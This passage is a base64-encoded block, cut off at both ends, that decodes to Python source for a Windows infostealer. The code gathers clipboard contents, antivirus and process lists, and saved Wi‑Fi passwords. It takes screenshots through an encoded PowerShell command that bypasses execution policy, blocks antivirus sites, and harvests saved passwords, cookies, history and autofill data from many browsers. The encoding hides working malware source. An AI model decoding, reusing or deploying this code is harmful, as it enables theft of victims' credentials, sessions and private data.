9wJywgb3MucGF0aC5qb2luKG9zLmdldGVudigndXNlcnByb2ZpbGUnKSwgJ0Rlc2t0b3AnKSksICgnUGljdHVyZXMnLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCd1c2VycHJvZmlsZScpLCAnUGljdHVyZXMnKSksICgnRG9jdW1lbnRzJywgb3MucGF0aC5qb2luKG9zLmdldGVudigndXNlcnByb2ZpbGUnKSwgJ0RvY3VtZW50cycpKSwgKCdNdXNpYycsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ3VzZXJwcm9maWxlJyksICdNdXNpYycpKSwgKCdWaWRlb3MnLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCd1c2VycHJvZmlsZScpLCAnVmlkZW9zJykpLCAoJ0Rvd25sb2FkcycsIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ3VzZXJwcm9maWxlJyksICdEb3dubG9hZHMnKSkpOgogICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIoZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgZGlyY29udGVudDogbGlzdCA9IG9zLmxpc3RkaXIoZGlyKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAnZGVzbHRvcC5pbmknIGluIGRpcmNvbnRlbnQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXJjb250ZW50LnJlbW92ZSgnZGVza3RvcC5pbmknKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXJjb250ZW50OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VzcyA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0cmVlIC9BIC9GJywgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgY3dkPWRpcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHByb2Nlc3MucmV0dXJuY29kZSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dFtuYW1lXSA9IChuYW1lICsgJ1xuJyArICdcbicuam9pbihwcm9jZXNzLnN0ZG91dC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zcGxpdGxpbmVzKClbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDM6XSkpLnJlcGxhY2UoJ3wgICAnLCBQSVBFKS5yZXBsYWNlKCcrLS0tJywgVEVFKS5yZXBsYWNlKCdcXC0tLScsIEVMQk9XKQogICAgICAgICAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gb3V0cHV0Lml0ZW1zKCk6CiAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMob3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnRGlyZWN0b3JpZXMnKSwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwgJ0RpcmVjdG9yaWVzJywgJ3t9LnR4dCcuZm9ybWF0KGtleSkpLCAndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUodmFsdWUpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5TeXN0ZW1JbmZvU3RvbGVuID0gVHJ1ZQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIEdldENsaXBib2FyZChzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlU3lzdGVtSW5mbzoKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdHZXR0aW5nIGNsaXBib2FyZCB0ZXh0JykKICAgICAgICAgICAgICAgIHNhdmVUb0RpciA9IG9zLnBhdGguam9pbihzZWxmLlRlbXBGb2xkZXIsICdTeXN0ZW0nKQogICAgICAgICAgICAgICAgcHJvY2VzcyA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICAgICAgICAgICdwb3dlcnNoZWxsIEdldC1DbGlwYm9hcmQnLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQogICAgICAgICAgICAgICAgaWYgcHJvY2Vzcy5yZXR1cm5jb2RlID09IDA6CiAgICAgICAgICAgICAgICAgICAgY29udGVudCA9IHByb2Nlc3Muc3Rkb3V0LmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBjb250ZW50OgogICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhzYXZlVG9EaXIsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvRGlyLCAnQ2xpcGJvYXJkLnR4dCcpLCAndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGNvbnRlbnQpCgogICAgICAgIEBFcnJvcnMuQ2F0Y2gKICAgICAgICBkZWYgR2V0QW50aXZpcnVzKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgICAgIGlmIFNldHRpbmdzLkNhcHR1cmVTeXN0ZW1JbmZvOgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ0dldHRpbmcgYW50aXZpcnVzJykKICAgICAgICAgICAgICAgIHNhdmVUb0RpciA9IG9zLnBhdGguam9pbihzZWxmLlRlbXBGb2xkZXIsICdTeXN0ZW0nKQogICAgICAgICAgICAgICAgcHJvY2VzcyA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICAgICAgICAgICdXTUlDIC9Ob2RlOmxvY2FsaG9zdCAvTmFtZXNwYWNlOlxcXFxyb290XFxTZWN1cml0eUNlbnRlcjIgUGF0aCBBbnRpdmlydXNQcm9kdWN0IEdldCBkaXNwbGF5TmFtZScsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpCiAgICAgICAgICAgICAgICBpZiBwcm9jZXNzLnJldHVybmNvZGUgPT0gMDoKICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBwcm9jZXNzLnN0ZG91dC5kZWNvZGUoCiAgICAgICAgICAgICAgICAgICAgICAgIGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5yZXBsYWNlKCdcclxuJywgJ1xuJykuc3BsaXRsaW5lcygpCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKG91dHB1dCkgPj0gMjoKICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gb3V0cHV0WzE6XQogICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhzYXZlVG9EaXIsIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvRGlyLCAnQW50aXZpcnVzLnR4dCcpLCAndycsIGVuY29kaW5nPSd1dGYtOCcsIGVycm9ycz0naWdub3JlJykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoJ1xuJy5qb2luKG91dHB1dCkpCgogICAgICAgIEBFcnJvcnMuQ2F0Y2gKICAgICAgICBkZWYgR2V0VGFza0xpc3Qoc2VsZikgLT4gTm9uZToKICAgICAgICAgICAgaWYgU2V0dGluZ3MuQ2FwdHVyZVN5c3RlbUluZm86CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnR2V0dGluZyB0YXNrIGxpc3QnKQogICAgICAgICAgICAgICAgc2F2ZVRvRGlyID0gb3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwgJ1N5c3RlbScpCiAgICAgICAgICAgICAgICBwcm9jZXNzID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgICAgICAgICAgJ3Rhc2tsaXN0IC9GTyBMSVNUJywgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgICAgIG91dHB1dCA9IHByb2Nlc3Muc3Rkb3V0LmRlY29kZSgKICAgICAgICAgICAgICAgICAgICBlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkucmVwbGFjZSgnXHJcbicsICdcbicpCiAgICAgICAgICAgICAgICBpZiBvdXRwdXQ6CiAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoc2F2ZVRvRGlyLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvRGlyLCAnVGFzayBMaXN0LnR4dCcpLCAndycsIGVycm9ycz0naWdub3JlJykgYXMgdGFza2xpc3Q6CiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tsaXN0LndyaXRlKG91dHB1dCkKCiAgICAgICAgQEVycm9ycy5DYXRjaAogICAgICAgIGRlZiBHZXRXaWZpUGFzc3dvcmRzKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgICAgIGlmIFNldHRpbmdzLkNhcHR1cmVXaWZpUGFzc3dvcmRzOgogICAgICAgICAgICAgICAgTG9nZ2VyLmluZm8oJ0dldHRpbmcgd2lmaSBwYXNzd29yZHMnKQogICAgICAgICAgICAgICAgc2F2ZVRvRGlyID0gb3MucGF0aC5qb2luKHNlbGYuVGVtcEZvbGRlciwgJ1N5c3RlbScpCiAgICAgICAgICAgICAgICBwYXNzd29yZHMgPSBVdGlsaXR5LkdldFdpZmlQYXNzd29yZHMoKQogICAgICAgICAgICAgICAgcHJvZmlsZXMgPSBsaXN0KCkKICAgICAgICAgICAgICAgIGZvciBwcm9maWxlLCBwc3cgaW4gcGFzc3dvcmRzLml0ZW1zKCk6CiAgICAgICAgICAgICAgICAgICAgcHJvZmlsZXMuYXBwZW5kKGYnTmV0d29yazoge3Byb2ZpbGV9XG5QYXNzd29yZDoge3Bzd30nKQogICAgICAgICAgICAgICAgaWYgcHJvZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgb3MubWFrZWRpcnMoc2F2ZVRvRGlyLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvRGlyLCAnV2lmaSBOZXR3b3Jrcy50eHQnKSwgJ3cnLCBlbmNvZGluZz0ndXRmLTgnLCBlcnJvcnM9J2lnbm9yZScpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoc2VsZi5TZXBhcmF0b3IubHN0cmlwKCkgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuU2VwYXJhdG9yLmpvaW4ocHJvZmlsZXMpKQogICAgICAgICAgICAgICAgICAgIHNlbGYuV2lmaVBhc3N3b3Jkc0NvdW50ICs9IGxlbihwcm9maWxlcykKCiAgICAgICAgQEVycm9ycy5DYXRjaAogICAgICAgIGRlZiBUYWtlU2NyZWVuc2hvdChzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5DYXB0dXJlU2NyZWVuc2hvdDoKICAgICAgICAgICAgICAgIExvZ2dlci5pbmZvKCdUYWtpbmcgc2NyZWVuc2hvdCcpCiAgICAgICAgICAgICAgICBjb21tYW5kID0gJ0pBQnpBRzhBZFFCeUFHTUFaUUFnQUQwQUlBQkFBQ0lBRFFBS0FIVUFjd0JwQUc0QVp3QWdBRk1BZVFCekFIUUFaUUJ0QURzQURRQUtBSFVBY3dCcEFHNEFad0FnQUZNQWVRQnpBSFFBWlFCdEFDNEFRd0J2QUd3QWJBQmxBR01BZEFCcEFHOEFiZ0J6QUM0QVJ3QmxBRzRBWlFCeUFHa0FZd0E3QUEwQUNnQjFBSE1BYVFCdUFHY0FJQUJUQUhrQWN3QjBBR1VBYlFBdUFFUUFjZ0JoQUhjQWFRQnVBR2NBT3dBTkFBb0FkUUJ6QUdrQWJnQm5BQ0FBVXdCNUFITUFkQUJsQUcwQUxnQlhBR2tBYmdCa0FHOEFkd0J6QUM0QVJnQnZBSElBYlFCekFEc0FEUUFLQUEwQUNnQndBSFVBWWdCc0FHa0FZd0FnQUdNQWJBQmhBSE1BY3dBZ0FGTUFZd0J5QUdVQVpRQnVBSE1BYUFCdkFIUUFEUUFLQUhzQURRQUtBQ0FBSUFBZ0FDQUFjQUIxQUdJQWJBQnBBR01BSUFCekFIUUFZUUIwQUdrQVl3QWdBRXdBYVFCekFIUUFQQUJDQUdrQWRBQnRBR0VBY0FBK0FDQUFRd0JoQUhBQWRBQjFBSElBWlFCVEFHTUFjZ0JsQUdVQWJnQnpBQ2dBS1FBTkFBb0FJQUFnQUNBQUlBQjdBQTBBQ2dBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBZGdCaEFISUFJQUJ5QUdVQWN3QjFBR3dBZEFCekFDQUFQUUFnQUc0QVpRQjNBQ0FBVEFCcEFITUFkQUE4QUVJQWFRQjBBRzBBWVFCd0FENEFLQUFwQURzQURRQUtBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQjJBR0VBY2dBZ0FHRUFiQUJzQUZNQVl3QnlBR1VBWlFCdUFITUFJQUE5QUNBQVV3QmpBSElBWlFCbEFHNEFMZ0JCQUd3QWJBQlRBR01BY2dCbEFHVUFiZ0J6QURzQURRQUtBQTBBQ2dBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBWmdCdkFISUFaUUJoQUdNQWFBQWdBQ2dBVXdCakFISUFaUUJsQUc0QUlBQnpBR01BY2dCbEFHVUFiZ0FnQUdrQWJnQWdBR0VBYkFCc0FGTUFZd0J5QUdVQVpRQnVBSE1BS1FBTkFBb0FJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FIc0FEUUFLQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBSFFBY2dCNUFBMEFDZ0FnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQjdBQTBBQ2dBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBRklBWlFCakFIUUFZUUJ1QUdjQWJBQmxBQ0FBWWdCdkFIVUFiZ0JrQUhNQUlBQTlBQ0FBY3dCakFISUFaUUJsQUc0QUxnQkNBRzhBZFFCdUFHUUFjd0E3QUEwQUNnQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUhVQWN3QnBBRzRBWndBZ0FDZ0FRZ0JwQUhRQWJRQmhBSEFBSUFCaUFHa0FkQUJ0QUdFQWNBQWdBRDBBSUFCdUFHVUFkd0FnQUVJQWFRQjBBRzBBWVFCd0FDZ0FZZ0J2QUhVQWJnQmtBSE1BTGdCWEFHa0FaQUIwQUdnQUxBQWdBR0lBYndCMUFHNEFaQUJ6QUM0QVNBQmxBR2tBWndCb0FIUUFLUUFwQUEwQUNnQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUhzQURRQUtBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFCMUFITUFhUUJ1QUdjQUlBQW9BRWNBY2dCaEFIQUFhQUJwQUdNQWN3QWdBR2NBY2dCaEFIQUFhQUJwQUdNQWN3QWdBRDBBSUFCSEFISUFZUUJ3QUdnQWFRQmpBSE1BTGdCR0FISUFid0J0QUVrQWJRQmhBR2NBWlFBb0FHSUFhUUIwQUcwQVlRQndBQ2tBS1FBTkFBb0FJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUhzQURRQUtBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUdjQWNnQmhBSEFBYUFCcEFHTUFjd0F1QUVNQWJ3QndBSGtBUmdCeUFHOEFiUUJUQUdNQWNnQmxBR1VBYmdBb0FHNEFaUUIzQUNBQVVBQnZBR2tBYmdCMEFDZ0FZZ0J2QUhVQWJnQmtBSE1BTGdCTUFHVUFaZ0IwQUN3QUlBQmlBRzhBZFFCdUFHUUFjd0F1QUZRQWJ3QndBQ2tBTEFBZ0FGQUFid0JwQUc0QWRBQXVBRVVBYlFCd0FIUUFlUUFzQUNBQVlnQnZBSFVBYmdCa0FITUFMZ0JUQUdrQWVnQmxBQ2tBT3dBTkFBb0FJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUgwQURRQUtBQTBBQ2dBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFjZ0JsQUhNQWRRQnNBSFFBY3dBdUFFRUFaQUJrQUNnQUtBQkNBR2tBZEFCdEFHRUFjQUFwQUdJQWFRQjBBRzBBWVFCd0FDNEFRd0JzQUc4QWJnQmxBQ2dBS1FBcEFEc0FEUUFLQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFmUUFOQUFvQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBZlFBTkFBb0FJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQVl3QmhBSFFBWXdCb0FDQUFLQUJGQUhnQVl3QmxBSEFBZEFCcEFHOEFiZ0FwQUEwQUNnQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFCN0FBMEFDZ0FnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDOEFMd0FnQUVnQVlRQnVBR1FBYkFCbEFDQUFZUUJ1QUhrQUlBQmxBSGdBWXdCbEFIQUFkQUJwQUc4QWJnQnpBQ0FBYUFCbEFISUFaUUFOQUFvQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBZlFBTkFBb0FJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FIMEFEUUFLQUEwQUNnQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQWNnQmxBSFFBZFFCeUFHNEFJQUJ5QUdVQWN3QjFBR3dBZEFCekFEc0FEUUFLQUNBQUlBQWdBQ0FBZlFBTkFBb0FmUUFOQUFvQUlnQkFBQTBBQ2dBTkFBb0FRUUJrQUdRQUxRQlVBSGtBY0FCbEFDQUFMUUJVQUhrQWNBQmxBRVFBWlFCbUFHa0FiZ0JwQUhRQWFRQnZBRzRBSUFBa0FITUFid0IxQUhJQVl3QmxBQ0FBTFFCU0FHVUFaZ0JsQUhJQVpRQnVBR01BWlFCa0FFRUFjd0J6QUdVQWJRQmlBR3dBYVFCbEFITUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFUUFjZ0JoQUhjQWFRQnVBR2NBTEFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVndCcEFHNEFaQUJ2QUhjQWN3QXVBRVlBYndCeUFHMEFjd0FOQUFvQURRQUtBQ1FBY3dCakFISUFaUUJsQUc0QWN3Qm9BRzhBZEFCekFDQUFQUUFnQUZzQVV3QmpBSElBWlFCbEFHNEFjd0JvQUc4QWRBQmRBRG9BT2dCREFHRUFjQUIwQUhVQWNnQmxBRk1BWXdCeUFHVUFaUUJ1QUhNQUtBQXBBQTBBQ2dBTkFBb0FEUUFLQUdZQWJ3QnlBQ0FBS0FBa0FHa0FJQUE5QUNBQU1BQTdBQ0FBSkFCcEFDQUFMUUJzQUhRQUlBQWtBSE1BWXdCeUFHVUFaUUJ1QUhNQWFBQnZBSFFBY3dBdUFFTUFid0IxQUc0QWRBQTdBQ0FBSkFCcEFDc0FLd0FwQUhzQURRQUtBQ0FBSUFBZ0FDQUFKQUJ6QUdNQWNnQmxBR1VBYmdCekFHZ0Fid0IwQUNBQVBRQWdBQ1FBY3dCakFISUFaUUJsQUc0QWN3Qm9BRzhBZEFCekFGc0FKQUJwQUYwQURRQUtBQ0FBSUFBZ0FDQUFKQUJ6QUdNQWNnQmxBR1VBYmdCekFHZ0Fid0IwQUM0QVV3QmhBSFlBWlFBb0FDSUFMZ0F2QUVRQWFRQnpBSEFBYkFCaEFIa0FJQUFvQUNRQUtBQWtBR2tBS3dBeEFDa0FLUUF1QUhBQWJnQm5BQ0lBS1FBTkFBb0FJQUFnQUNBQUlBQWtBSE1BWXdCeUFHVUFaUUJ1QUhNQWFBQnZBSFFBTGdCRUFHa0Fjd0J3QUc4QWN3QmxBQ2dBS1FBTkFBb0FmUUE9JwogICAgICAgICAgICAgICAgaWYgc3VicHJvY2Vzcy5ydW4oWydwb3dlcnNoZWxsLmV4ZScsICctTm9Qcm9maWxlJywgJy1FeGVjdXRpb25Qb2xpY3knLCAnQnlwYXNzJywgJy1FbmNvZGVkQ29tbWFuZCcsIGNvbW1hbmRdLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlLCBjd2Q9c2VsZi5UZW1wRm9sZGVyKS5yZXR1cm5jb2RlID09IDA6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5TY3JlZW5zaG90VGFrZW4gPSBUcnVlCgogICAgICAgIEBFcnJvcnMuQ2F0Y2gKICAgICAgICBkZWYgQmxvY2tTaXRlcyhzZWxmKSAtPiBOb25lOgogICAgICAgICAgICBpZiBTZXR0aW5ncy5CbG9ja0F2U2l0ZXM6CiAgICAgICAgICAgICAgICBMb2dnZXIuaW5mbygnQmxvY2tpbmcgQVYgc2l0ZXMnKQogICAgICAgICAgICAgICAgVXRpbGl0eS5CbG9ja1NpdGVzKCkKICAgICAgICAgICAgICAgIFV0aWxpdHkuVGFza0tpbGwoJ2Nocm9tZScsICdmaXJlZm94JywgJ21zZWRnZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzYWZhcmknLCAnb3BlcmEnLCAnaWV4cGxvcmUnKQoKICAgICAgICBARXJyb3JzLkNhdGNoCiAgICAgICAgZGVmIFN0ZWFsQnJvd3NlckRhdGEoc2VsZikgLT4gTm9uZToKICAgICAgICAgICAgaWYgbm90IGFueSgoU2V0dGluZ3MuQ2FwdHVyZUNvb2tpZXMsIFNldHRpbmdzLkNhcHR1cmVQYXNzd29yZHMsIFNldHRpbmdzLkNhcHR1cmVIaXN0b3J5IG9yIFNldHRpbmdzLkNhcHR1cmVBdXRvZmlsbHMpKToKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBMb2dnZXIuaW5mbygnU3RlYWxpbmcgYnJvd3NlciBkYXRhJykKICAgICAgICAgICAgdGhyZWFkczogbGlzdFtUaHJlYWRdID0gW10KICAgICAgICAgICAgcGF0aHMgPSB7J0JyYXZlJzogKG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnQnJhdmVTb2Z0d2FyZScsICdCcmF2ZS1Ccm93c2VyJywgJ1VzZXIgRGF0YScpLCAnYnJhdmUnKSwgJ0Nocm9tZSc6IChvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ0dvb2dsZScsICdDaHJvbWUnLCAnVXNlciBEYXRhJyksICdjaHJvbWUnKSwgJ0Nocm9taXVtJzogKG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnQ2hyb21pdW0nLCAnVXNlciBEYXRhJyksICdjaHJvbWl1bScpLCAnQ29tb2RvJzogKG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnQ29tb2RvJywgJ0RyYWdvbicsICdVc2VyIERhdGEnKSwgJ2NvbW9kbycpLCAnRWRnZSc6IChvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ01pY3Jvc29mdCcsICdFZGdlJywgJ1VzZXIgRGF0YScpLCAnbXNlZGdlJyksICdFcGljUHJpdmFjeSc6IChvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ0VwaWMgUHJpdmFjeSBCcm93c2VyJywgJ1VzZXIgRGF0YScpLCAnZXBpYycpLCAnSXJpZGl1bSc6IChvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICBvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnSXJpZGl1bScsICdVc2VyIERhdGEnKSwgJ2lyaWRpdW0nKSwgJ09wZXJhJzogKG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2FwcGRhdGEnKSwgJ09wZXJhIFNvZnR3YXJlJywgJ09wZXJhIFN0YWJsZScpLCAnb3BlcmEnKSwgJ09wZXJhIEdYJzogKG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2FwcGRhdGEnKSwgJ09wZXJhIFNvZnR3YXJlJywgJ09wZXJhIEdYIFN0YWJsZScpLCAnb3BlcmFneCcpLCAnU2xpbWpldCc6IChvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ1NsaW1qZXQnLCAnVXNlciBEYXRhJyksICdzbGltamV0JyksICdVUic6IChvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdsb2NhbGFwcGRhdGEnKSwgJ1VSIEJyb3dzZXInLCAnVXNlciBEYXRhJyksICd1cmJyb3dzZXInKSwgJ1ZpdmFsZGknOiAob3MucGF0aC5qb2luKG9zLmdldGVudignbG9jYWxhcHBkYXRhJyksICdWaXZhbGRpJywgJ1VzZXIgRGF0YScpLCAndml2YWxkaScpLCAnWWFuZGV4JzogKG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ2xvY2FsYXBwZGF0YScpLCAnWWFuZGV4JywgJ1lhbmRleEJyb3dzZXInLCAnVXNlciBEYXRhJyksICd5YW5kZXgnKX0KICAgICAgICAgICAgZm9yIG5hbWUsIGl0ZW0gaW4gcGF0aHMuaXRlbXMoKToKICAgICAgICAgICAgICAgIHBhdGgsIHByb2NuYW1lID0gaXRlbQogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoKToKCiAgICAgICAgICAgICAgICAgICAgZGVmIHJ1bihuYW1lLCBwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbGl0eS5UYXNrS2lsbChwcm9jbmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyb3dzZXIgPSBCcm93c2Vycy5DaHJvbWl1bShwYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2F2ZVRvRGlyID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuVGVtcEZvbGRlciwgJ0NyZWRlbnRpYWxzJywgbmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkcyA9IGJyb3dzZXIuR2V0UGFzc3dvcmRzKCkgaWYgU2V0dGluZ3MuQ2FwdHVyZVBhc3N3b3JkcyBlbHNlIE5vbmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgPSBicm93c2VyLkdldENvb2tpZXMoKSBpZiBTZXR0aW5ncy5DYXB0dXJlQ29va2llcyBlbHNlIE5vbmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhpc3RvcnkgPSBicm93c2VyLkdldEhpc3RvcnkoKSBpZiBTZXR0aW5ncy5DYXB0dXJlSGlzdG9yeSBlbHNlIE5vbmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9maWxscyA9IGJyb3dzZXIuR2V0QXV0b2ZpbGxzKCkgaWYgU2V0dGluZ3MuQ2FwdHVyZUF1dG9maWxscyBlbHNlIE5vbmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhc3N3b3JkcyBvciBjb29raWVzIG9yIGhpc3Rvcnkgb3IgYXV0b2ZpbGxzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLm1ha2VkaXJzKHNhdmVUb0RpciwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXNzd29yZHM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IFsnVVJMOiB7fVxuVXNlcm5hbWU6IHt9XG5QYXNzd29yZDoge30nLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICp4KSBmb3IgeCBpbiBwYXNzd29yZHNdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2F2ZVRvRGlyLCAne30gUGFzc3dvcmRzLnR4dCcuZm9ybWF0KG5hbWUpKSwgJ3cnLCBlcnJvcnM9J2lnbm9yZScsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKHNlbGYuU2VwYXJhdG9yLmxzdHJpcCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkg